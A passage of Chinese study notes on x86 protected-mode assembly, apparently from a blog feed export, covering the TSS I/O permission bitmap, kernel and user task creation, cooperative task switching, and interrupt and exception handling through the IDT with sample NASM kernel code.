<p>其中<strong>I/O许可位的偏移M</strong>若大于<strong>TSS</strong>描述符的段界限，则意味着没有<strong>I/O许可位</strong>。在这种情况下，如果当前<strong>CPL ≥ IOPL</strong>，就意味着必须检查<strong>I/O许可位串</strong>，但是没有<strong>I/O</strong>许可位串就意味着不允许访问硬件端口，执行任何硬件I/O指令都会引发处理器的异常中断。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/0bd3c3d8808b9315f7a79ceb4e3209a5-166832967486822.png" class="">

<p>处理器检查<strong>I/O</strong>许可位方法如下：</p>
<ol>
<li>先根据端口号计算它在<strong>I/O</strong>许可位映射区的哪个字节中；</li>
<li>然后读取该字节，并测试那个<strong>byte</strong>位，<br>如<strong>out 0x09, al</strong>指令：端口<strong>0x09</strong>位于第二个<strong>byte</strong>，而且位于第二个字节的<strong>位1</strong>.处理器读取并测试这个<strong>byte位</strong>是0还是1来决定是否允许执行这个<strong>out</strong>指令。</li>
</ol>
<p>I/O端口是按照字节编址的，即每个端口只能用来读取一个字节的数据，那些多字节的端口其实是合并了几个端口组成一个多字节端口的：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ff8895b5ee0a42a472ea2ed58c2914cc-166832967486823.png" class="">
<p>由于<strong>I/O端口</strong>是按照字节编址的原因，当处理器执行一个字或者双字的<strong>I/O</strong>指令时，会检查许可位串中的2个或者4个连续的<strong>byte</strong>，而且要求它们必须都是0，否则引发异常中断。</p>
<p>麻烦在于这些连续的<strong>byte</strong>有可能是跨字节的，即一些<strong>byte</strong>位于前一个字节有些位于后一个字节，<br>如下：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/67391e2a303f4dec1de5a884b13b9704-166832967486824.png" class="">
<p>所以处理器每次都从<strong>I/O许可位映射区</strong>读取2个连续的字节，而不是1个字节。</p>
<p>这种操作方式也导致了另一个问题，即要检查的<strong>byte</strong>如果在最后一个字节中这样的读操作就会导致越界。为了防止这种情况发生处理器要求<strong>I/O许可位映射区</strong>最后必须附加一个额外的字节，其值为<strong>0xFF</strong>。<br>如下：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ef823bfa7f5ca793b66e36664ede8de5-166832967486825.png" class="">
<p>若<strong>I/O许可映射区</strong>本身只有11个字节，除去最后一位<strong>0xFF</strong>，只剩下10个字节，那么只能映射80个端口，访问更高地址的端口（高于79号端口）将引发异常中断。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/1ff6610bde8ec0dea0d453b3b7f8513b-166832967486826.png" class="">

<h2 id="06-任务切换的方法以及内核任务的确立"><a href="#06-任务切换的方法以及内核任务的确立" class="headerlink" title="06. 任务切换的方法以及内核任务的确立"></a>06. 任务切换的方法以及内核任务的确立</h2><p>内核本身要当作一个独立的任务，内核正在执行现在要为其补一个合法的手续。<br>创建内核的<strong>TSS</strong>，接着要在<strong>TSS</strong>中填充一些内容，在任务切换之前提前准备好。</p>
<p>设置内核任务的<strong>TSS</strong>：</p>
<pre><code class="assembly">    ;为内核任务的TSS分配内存空间
    mov ecx,104                        ;为该任务的TSS分配内存
    call sys_routine_seg_sel:allocate_memory
    mov [es:esi+0x14],ecx              ;在内核TCB中保存TSS基地址
    
    ;在程序管理器的TSS中设置必要的项目 
    mov word [es:ecx+96],0             ;没有LDT。处理器允许没有LDT的任务。
    mov word [es:ecx+102],103          ;没有I/O位图。0特权级事实上不需要。
    mov word [es:ecx+0],0              ;反向链=0
    mov dword [es:ecx+28],0            ;登记CR3(PDBR)
    mov word [es:ecx+100],0            ;T=0
                                       ;不需要0、1、2特权级堆栈。0特级不
                                       ;会向低特权级转移控制。
</code></pre>
<ol>
<li>内核任务不需要<strong>LDT</strong>，所以在内核<strong>TSS</strong>偏移<strong>0x96</strong>的地方填写数字0即可；</li>
<li>内核任务也不需要<strong>I/O许可位映射区</strong>，内核是0特权级，始终可以进行所有<strong>I/O</strong>操作。这里偏移填写<strong>103</strong>为内核<strong>TSS</strong>的界限值，即表示保存在<strong>I/O许可位映射区</strong>；</li>
<li>反向链相关，硬件任务切换在64位处理器上不再支持，除非以兼容模式允许运行。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/3135d4b33d7c48116f2f6bf55cd66f78-166832967486828.png" class="">
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/a9ab3530a487a16867948ba0c25cf83d-166832967486827.png" class=""></li>
</ol>
<ul>
<li>用<strong>CALL</strong>指令发起任务切换时，任务之间会形成一个任务链，可以通过任务链反向切换到原来的任务中。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/001d7c469b6f0b1abc71c9e0f9713cd5-166832967486831.png" class=""></li>
<li>所以在<strong>TSS</strong>中偏移为0的位置，置零即可：<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/39a8a20c8af636fab0a1f4563c1b9bad-166832967486829.png" class=""></li>
</ul>
<ol start="4">
<li>和分页相关的位<strong>暂时先清0</strong><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/77fb6ce6c965082e6d67af30c2154161-166832967486830.png" class=""></li>
<li>设置<strong>T位</strong>为0，因为内核特权级为0，不会向低特权级实施控制转移。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/b6b82d293be287f02f228efc14995d42-166832967486834.png" class=""></li>
</ol>
<p>创建内核任务的<strong>TSS</strong>莫舒服，安装到<strong>GDT</strong>中：</p>
<pre><code class="assembly">    ;创建TSS描述符，并安装到GDT中 
    mov eax,ecx                        ;TSS的起始线性地址
    mov ebx,103                        ;段长度（界限）
    mov ecx,0x00008900                 ;TSS描述符，特权级0
    call sys_routine_seg_sel:make_seg_descriptor
    call sys_routine_seg_sel:set_up_gdt_descriptor
    mov word [es:esi+0x18],cx          ;登记TSS选择子到TCB
    mov word [es:esi+0x04],0xffff      ;任务的状态为“忙”
    
    ;任务寄存器TR中的内容是任务存在的标志，该内容也决定了当前任务是谁。
    ;下面的指令为当前正在执行的0特权级任务“程序管理器”后补手续（TSS）。
    ltr cx
    
    ;现在可认为“程序管理器”任务正执行中
    mov ebx,core_msg1
    call sys_routine_seg_sel:put_string
</code></pre>
<h2 id="07-用户任务的创建和初始化"><a href="#07-用户任务的创建和初始化" class="headerlink" title="07. 用户任务的创建和初始化"></a>07. 用户任务的创建和初始化</h2><p><strong>TCB</strong>中偏移为<strong>0x04</strong>位置：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/9be2c12d07936a3550453e7f55b65580-166832967486832.png" class="">
<p>任务状态为<mark>0表示就绪</mark>、为<mark>0xFFFF</mark>表示忙状态、为<mark>0x3333</mark>表示任务已经终止。</p>
<p>为用户任务创建<strong>TCB</strong>：</p>
<pre><code class="assembly">    ;以下开始创建用户任务
    mov ecx,0x46
    call sys_routine_seg_sel:allocate_memory
    mov word [es:ecx+0x04],0           ;任务状态：就绪
    call append_to_tcb_link            ;将此TCB添加到TCB链中
</code></pre>
<p>之后加载和重定位用户程序，并将其创建为任务。</p>
<pre><code class="assembly">    push dword 50                      ;用户程序位于逻辑50扇区
    push ecx                           ;压入任务控制块起始线性地址 
    
    call load_relocate_program 
</code></pre>
<p>在例程<strong>load_relocate_program</strong>中：</p>
<ol>
<li><p>创建<strong>LDT</strong>；</p>
</li>
<li><p>加载用户程序；</p>
</li>
<li><p>创建用户程序每个段的描述符，并将其安装到<strong>LDT</strong>中；</p>
</li>
<li><p>重定位用户程序的符号地址检索表<strong>SALT</strong>，本章在<strong>SALT</strong>中新增一个条目<mark>InitTaskSwitch</mark>用于任务切换。</p>
</li>
<li><p>创建<strong>0、1、2特权级</strong>的栈段描述符及其选择子，为通过调用门转移控制而准备的；</p>
</li>
<li><p>在<strong>GDT</strong>中登记<strong>LDT</strong>描述符；</p>
</li>
<li><p>创建用户任务的<strong>TSS</strong>；</p>
</li>
<li><p>在用户任务的<strong>TSS</strong>中登记相关的信息，参考<strong>TSS结构</strong>；</p>
<ol>
<li>填写任务的反向链</li>
<li>填写<strong>0、1、2特权级</strong>的栈段选择子和栈指针</li>
<li>登记<strong>LDT</strong>选择子</li>
<li>登记<strong>I/O许可位映射区</strong>偏移</li>
<li>登记T标志（TSS+100的调试位）</li>
<li>登记<strong>CR3</strong>（和分页有关）</li>
<li>登记其它信息<ol>
<li>以前内核不是单独的任务而是用户任务的私有部分，所以用户程序加载之后模拟调用门返回，从任务的全局部分返回任务的私有部分。本章中内核为一个独立的任务，是正在执行的任务，所以当我们创建了用户任务之后将使用任务切换的方式从内核任务切换到用户任务。</li>
<li>切换到用户任务时，一定会从用户任务的<strong>TSS</strong>中恢复现场，即使是用户任务的第一次执行，为了确保用户任务的第一次切换成功，需要在用户任务的<strong>TSS</strong>中设置哪些内容呢？</li>
<li>首先是<mark>0、1、2特权级</mark>的栈段选择子和栈指针；接着是通用寄存器的内容，一般都是运行时自动设置，也有一些需要单独设置（如<strong>EFLAGS</strong>中的<strong>LOPL</strong>字段、<strong>EIP</strong>要设置为用户任务入口点的偏移量）。</li>
<li>段寄存器的内容，可以提前设置也可以在程序中用指令初始化，<strong>CS</strong>必须在这里设置为用户程序入口点的代码段选择子。</li>
<li>若用户任务有<strong>LDT</strong>，则需要设置<strong>LDT</strong>段选择子。</li>
<li>若用户任务有<strong>I/O许可位映射区</strong>，则需要设置映射区的偏移。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/a65a44442dca24365dd94997b837543d-166832967486833.png" class=""></li>
</ol>
</li>
</ol>
</li>
<li><p>创建用户任务的<strong>TSS</strong>描述符，并将其安装在<strong>GDT</strong>中，安装之后在<strong>CX</strong>中返回<strong>TSS</strong>的选择子，将其登记在用户任务控制块<strong>TCB</strong>中。</p>
</li>
<li><p>从例程<strong>load_relocate_program</strong>中返回。</p>
</li>
</ol>
<p>创建一个用户任务之后还可以创建其它任务：</p>
<pre><code class="assembly">    ;可以创建更多的任务，例如：
    ;mov ecx,0x46
    ;call sys_routine_seg_sel:allocate_memory
    ;mov word [es:ecx+0x04],0           ;任务状态：空闲
    ;call append_to_tcb_link            ;将此TCB添加到TCB链中
    
    ;push dword 50                      ;用户程序位于逻辑50扇区
    ;push ecx                           ;压入任务控制块起始线性地址
    
    ;call load_relocate_program
</code></pre>
<p>之后就是任务管理的循环，用来发起内核任务到用户任务的切换、回收已经终止任务的资源、也可以选择创建新的任务。</p>
<pre><code class="assembly">.do_switch:
    ;主动切换到其它任务，给它们运行的机会
    call sys_routine_seg_sel:initiate_task_switch
    
    mov ebx,core_msg2
    call sys_routine_seg_sel:put_string
    
    ;这里可以添加创建新的任务的功能，比如：
    ;mov ecx,0x46
    ;call sys_routine_seg_sel:allocate_memory
    ;mov word [es:ecx+0x04],0           ;任务状态：空闲
    ;call append_to_tcb_link            ;将此TCB添加到TCB链中
    
    ;push dword 50                      ;用户程序位于逻辑50扇区
    ;push ecx                           ;压入任务控制块起始线性地址
    
    ;call load_relocate_program
    
    ;清理已经终止的任务，并回收它们占用的资源
    call sys_routine_seg_sel:do_task_clean
    
    mov eax,[tcb_chain]
.find_ready:
    cmp word [es:eax+0x04],0x0000      ;还有处于就绪状态的任务？
    jz .do_switch                      ;有，继续执行任务切换
    mov eax,[es:eax]
    or eax,eax                         ;还有用户任务吗？
    jnz .find_ready                    ;一直搜索到链表尾部
    
    ;已经没有可以切换的任务，停机
    mov ebx,core_msg3
    call sys_routine_seg_sel:put_string
    hlt
</code></pre>
<h2 id="08-简单的任务调度和切换策略"><a href="#08-简单的任务调度和切换策略" class="headerlink" title="08. 简单的任务调度和切换策略"></a>08. 简单的任务调度和切换策略</h2><p>接上一节<br>所有的任务都是平等的参与任务切换，切换到用户任务时做的是自己的私事，切换到内核任务时做的是管理整个系统。</p>
<p>使用例程<strong>initiate_task_switch</strong>进行任务切换，从任务链表中找到下一个就绪状态的任务，进行切换。<strong>tcb_chain</strong>中记录每个任务的<strong>TCB</strong>，其中有下一个任务的地址和这个任务的状态（<mark>0表示就绪</mark>、为<mark>0xFFFF</mark>表示忙状态、为<mark>0x3333</mark>表示任务已经终止）。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/d41c66dea07be9c7e5c05748e71cde5a-166832967486835.png" class="">
<p>任务调度策略：顺着<strong>TCB</strong>链表找到当前正在执行的任务，继续往后再找到一个就绪的任务，然后切换到这个就绪的任务。切换之后将任务的状态都进行改变（忙改为就绪、就绪改为忙）。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/bd85ede83741a94c9123371a21ebb6db-166832967486836.png" class="">
<p><mark>特殊情况1</mark>：如上图，如果系统只有一个任务则不执行切换。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/1dcaf8e5bb7db4a65880bcd7c3e953af-166832967486837.png" class="">
<p><mark>特殊情况2</mark>：如上图，每次都是从<strong>tcb_chain</strong>链表头部开始搜索，先找到忙的任务再往后找到就绪的任务。如果忙的任务处于链表尾部，则需要返回链表头部从头开始查找状态为就绪的任务，这样的轮转能保证每个任务都能有公平的轮转机会。</p>
<h2 id="09-遍历TCB链表寻找忙任务和就绪任务"><a href="#09-遍历TCB链表寻找忙任务和就绪任务" class="headerlink" title="09. 遍历TCB链表寻找忙任务和就绪任务"></a>09. 遍历TCB链表寻找忙任务和就绪任务</h2><p>本节是分析例程initiate_task_switch，具体看代码和视频。</p>
<h2 id="10-通过JMP-FAR执行任务切换的过程"><a href="#10-通过JMP-FAR执行任务切换的过程" class="headerlink" title="10. 通过JMP FAR执行任务切换的过程"></a>10. 通过JMP FAR执行任务切换的过程</h2><p>上一节中找到了<strong>状态忙的任务</strong>和<strong>状态就绪的任务</strong>。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/107c4944925dba82aa648298b8137c5d-166832967486838.png" class="">
<p>在64位处理器上不再提供硬件任务切换，操作系统也不适用硬件任务切换</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/01869b2eb6e10f8d5cae7caf15c17de4-166832967486839.png" class="">
<p>使用**jmp far [edi+0x14]**指令进行任务切换：</p>
<ul>
<li><strong>EDI</strong>保存就绪任务的<strong>TCB</strong>线性地址，<strong>TCB</strong>偏移0x14的地方，存放<strong>TSS</strong>的基地址和16位<strong>TSS</strong>选择子；</li>
<li>处理器执行这条指令时使用<strong>DS</strong>描述符高速缓存器中的基地址 + 段内偏移（EDI + 0X14），取出6个字节，假定它们是段选择子和段内偏移；当处理器发现后两个字节保存的段选择子是<strong>TSS</strong>选择子，则前面的4个字节段内偏移量会被忽略（实际上我们在这里保存的是TSS基地址）。</li>
<li>用这个选择子到<strong>GDT</strong>中寻找对应的描述符，处理器发现这是<strong>TSS</strong>描述符，就知道需要发起任务切换</li>
<li>保存旧任务的状态<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/fc427ef9510f44f38d1e12e15be5648a-166832967486840.png" class=""></li>
</ul>
<p>当前<strong>CS</strong>指向内核公共例程段，<strong>EIP</strong>指向下一条指令，则保存状态时，<strong>CS</strong>和<strong>EIP</strong>保存的是上述值。</p>
<ul>
<li>设置新任务的状态<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/70577bd2c49d9b5eb881ad75b116415d-166832967486841.png" class=""></li>
</ul>
<p>第一次是从内核任务切换到用户任务，在创建用户任务时，已经在用户任务的<strong>TSS</strong>中登记了各种信息，包括0、1、2三个特权级的栈段选择子<strong>SS</strong>和栈指针<strong>ESP</strong>，接着登记<strong>LDT</strong>选择子，之后是入口点信息，包括<strong>CS</strong>、<strong>EIP</strong>。一旦从用户任务的<strong>TSS</strong>中恢复这些信息，处理器就转移到了用户程序执行。</p>
<h2 id="11-内核任务与用户任务轮流执行的过程"><a href="#11-内核任务与用户任务轮流执行的过程" class="headerlink" title="11. 内核任务与用户任务轮流执行的过程"></a>11. 内核任务与用户任务轮流执行的过程</h2><p>看视频、代码即可，主要讲解了从内核任务切换到用户任务的执行流程。</p>
<h2 id="12-任务的中止和清理"><a href="#12-任务的中止和清理" class="headerlink" title="12. 任务的中止和清理"></a>12. 任务的中止和清理</h2><p>看视频、代码即可，主要讲解了从用户任务切换到内核任务的执行流程，其中会对任务进行清理。</p>
<p>虚拟机执行结果：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/image-20221113165458658.png" class="" title="image-20221113165458658">
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>x86协同式任务切换</tag>
      </tags>
  </entry>
  <entry>
    <title>中断和异常的处理与抢占式多任务</title>
    <url>/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<h2 id="1-中断和异常概述"><a href="#1-中断和异常概述" class="headerlink" title="1. 中断和异常概述"></a>1. 中断和异常概述</h2><p>协同式任务切换不一定要通过一个专门的接口例程进行，也可以用一般的例程进行。</p>
<span id="more"></span>

<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/fe53f291cfd54bdb4ff39df4c2a88337.png" class="">
<p>用户任务通过调用门切换到内核的<strong>put_string</strong>例程执行，在内核任务返回用户任务之前可以进行任务切换，之后再通过<strong>retf</strong>返回用户任务执行。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/0541841212d9120d7adc89707c464bc7.png" class="">

<ul>
<li>硬件中断信号，<mark>NMI</mark>是不可屏蔽中断、<mark>INTR</mark>是来自硬件中断引脚的可屏蔽中断。随机产生，与处理器是异步的。</li>
<li>软件中断，<mark>INT N</mark>是在软件内部主动引发的中断。</li>
<li>处理异常中断（Exceptions），是处理器内部产生的中断，表示处理器执行时产生了错误的状况。比如当处理器执行一条非法指令或者因条件不具备指令不能正常执行时将会引发这种类型的中断。如<mark>div指令</mark>中<mark>除数是0</mark>的情况。<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/e083d1c54d9b807af3a4d71568db31b6.png" class="">
终端和异常<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/9f6e794666998a02b19d053418864147.png" class="">
按照异常的产生原因分类：<ol>
<li>指令执行异常：处理器在执行指令时检测到程序的错误并由此而引发的异常</li>
<li>程序调试异常：供调试器使用，由<mark>INTO、INT3</mark>主动发起。用来检查特定的机器状态是否出现。<mark>INTO</mark>检查标志寄存器的<mark>OF=1</mark>（溢出标志位）则执行指令引发异常中断。<strong>INT3</strong>指令由调试器单步执行使用。</li>
<li>机器检查异常：和处理器架构有关，如在奔腾4、P6处理器家族上就实现了机器检查架构，用这种异常检测与硬件有关的总线错误、奇偶校验错误、高速缓存错误等等。</li>
</ol>
</li>
</ul>
<p>根据异常的性质和严重性分类：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/a1aab83b38172cd0c1405bb831af0706.png" class="">

<ol>
<li>故障（Faults）：通常可以纠正，如缺页异常。中断程序返回的是当前指令。</li>
<li>陷阱（Traps）：通常是在执行了截获陷阱条件的指令之后立即产生，通常用于调试<mark>INT3、INTO</mark>。中断程序返回的是当前指令的下一条指令。</li>
<li>终止（Aborts）：通常标志最严重的错误，如硬件错误、系统表错误（如GDT、LDT数据不一致、无效、错误），这类异常一般无法精确的报告引起错误的指令的位置。发生时程序和错误都不可能重新启动，双重异常（当处理器发生异常时，在转入异常执行时又发生了另一个异常）如中断向量号18，<mark>INT 0x18</mark>。</li>
</ol>
<p>对于某些异常来说，处理器再转入异常处理程序之前，会在栈中压入一个称为错误代码的数值，这样可以帮助诊断异常产生的位置和原因。</p>
<h2 id="02-保护模式下中断和异常的向量分配"><a href="#02-保护模式下中断和异常的向量分配" class="headerlink" title="02. 保护模式下中断和异常的向量分配"></a>02. 保护模式下中断和异常的向量分配</h2><p>终端和异常的编号叫做中断向量。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/826b6014ebc1fb0f05fc99bdb31944d1.png" class="">
<p>其中错误代码是在中断发生时，在进入中断处理程序之前压在栈中的错误代码。</p>
<h2 id="03-中断描述符、中断门和陷阱门"><a href="#03-中断描述符、中断门和陷阱门" class="headerlink" title="03. 中断描述符、中断门和陷阱门"></a>03. 中断描述符、中断门和陷阱门</h2><p>实模式下的中断向量表：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/70cbd9f6d7a234ea6667922d43c27f20.png" class="">
<p>中断发生时，处理器要么自发产生一个中断向量、要么从软中断指令的操作数到中断向量、或者从从外部的中断控制器取得一个中断向量。将该向量作为索引访问中断向量表<strong>IVT</strong>，具体做法是将中断向量乘以4作为偏移量访问<strong>IVT</strong>，从中取得中断处理过程的段地址和偏移地址，并转到那里执行。</p>
<p>保护模式下：使用中断描述符表<strong>IDT</strong>（Interrupt Descriptor Table），保存和中断处理过程相关的描述符，包括中断门、陷阱门、任务门，门是特殊的描述符。</p>
<p><mark>中断门</mark>描述符用来描述中断处理过程。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/05b1c6c1d0dcb160102e0248a536feca.png" class="">
<p><mark>陷阱门</mark>描述符用来描述陷阱中断的处理过程。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/506f1a49cbf434b592d7810c41d99dfc.png" class="">
<p>任务门，32位处理器支持，若<strong>IDT</strong>中描述的是一个任务门，则执行的是一个任务切换。在64位处理器中既不支持硬件切换也不支持任务门。</p>
<p>实模式下的中断向量表<strong>IVT</strong>只能位于内存的最低端。保护模式下的中断描述符表<strong>IDT</strong>可以位于内存的任何位置。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/7957d4bde64a8c498450b215e31de922.png" class="">
<p><strong>IDT</strong>的第一个描述符，即<mark>0号槽位</mark>也是有效的。</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/f0ce0cd6d25a0616bf8bbf347dbf1802.png" class="">

<ul>
<li>处理器用中断向量乘以8得到表内偏移，联合<strong>IDTR</strong>内的<strong>IDT</strong>基地址去访问内存；</li>
<li>从中取得<strong>中断门</strong>或<strong>陷阱门</strong>描述符；</li>
<li>在描述符中有中断处理过程的<strong>代码段选择子</strong>和<strong>段内偏移量</strong>；</li>
<li>取决于代码段选择子的<strong>TI位</strong>，去<strong>GDT</strong>或<strong>LDT</strong>中取得目标代码段的描述符；</li>
<li>从目标代码段的描述符中取得目标代码段的段基地址；</li>
<li>将<strong>段基地址</strong>和<strong>偏移量</strong>相加得到中断处理过程的的线性地址，从而转移执行。</li>
</ul>
<p>使用中断向量访问<strong>IDT</strong>时，中断向量超过<strong>IDT</strong>界限值时，就会产生常规保护异常**#GP**。</p>
<h2 id="04-本章程序介绍"><a href="#04-本章程序介绍" class="headerlink" title="04. 本章程序介绍"></a>04. 本章程序介绍</h2><p>引导程序：<mark>c13_mbr0.asm</mark></p>
<ol>
<li>取出<strong>GDT</strong>所在线性基地址</li>
<li>创建本程序相关描述符，接着使用<strong>cli</strong>指令关闭中断响应</li>
<li>进入保护模式</li>
<li>加载内核代码到内存中</li>
<li>创建内核相关的描述符</li>
<li>跳转执行内核</li>
</ol>
<p>内核程序：<mark>c30_core0.asm</mark></p>
<ol>
<li>创建各个段的选择子常量和<strong>IDT</strong>线性地址</li>
<li>内核头部段</li>
<li>内核公共例程段，除了之前创建的相关例程，本章增加了几个和中断相关的例程</li>
<li>内核核心数据段，各种数据</li>
<li>内核核心代码，改变了内核入口点<strong>start</strong>的程序。</li>
</ol>
<p>用户程序0：<mark>c30_app0.asm</mark><br>其他不变，死循环打印<mark>，，，，，，</mark></p>
<p>用户程序1：<mark>c30_app1.asm</mark><br>其他不变，死循环打印<mark>cccccc</mark></p>
<h2 id="05-创建并安装全部的256个中断门"><a href="#05-创建并安装全部的256个中断门" class="headerlink" title="05. 创建并安装全部的256个中断门"></a>05. 创建并安装全部的256个中断门</h2><p>在进入内核<mark>start</mark>之后，准备创建内核任务、用户任务并进行任务切换，在此之前需要准备好保护模式下的中断系统。</p>
<p>中断或异常发生时，并不是直接调用中断或异常处理程序，而是用中断向量先到中断描述符中寻找对应的中断描述符，即中断门或陷阱门，之后从中断门或陷阱门中间接找到中断处理过程。意味着必须为这个通用的中断处理过程创建中断门或陷阱门，并安装在中断描述符表<mark>IDT</mark>中。</p>
<p>创建中断门代码如下：</p>
<pre><code class="assembly">    ;前20个向量是处理器异常使用的
    mov eax,general_exception_handler  ;门代码在段内偏移地址
    mov bx,sys_routine_seg_sel         ;门代码所在段的选择子
    mov cx,0x8e00                      ;32位中断门，0特权级
    call sys_routine_seg_sel:make_gate_descriptor
</code></pre>
<p>中断门属性值<mark>8E00</mark>：</p>
<img src="/2022/12/11/30-%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E4%B8%8E%E6%8A%A2%E5%8D%A0%E5%BC%8F%E5%A4%9A%E4%BB%BB%E5%8A%A1/d24b99343349d21cb8e624e9d7860a1d.png" class="">
<p>创建好之后需要安装在中断描述符表<strong>IDT</strong>中，<strong>IDT</strong>现在还没有创建，创建<strong>IDT</strong>就是指定表的起始线性基地址，并从这个地址安装中断门和陷阱门就可以了。</p>
<p>目前系统内存布局：</p>
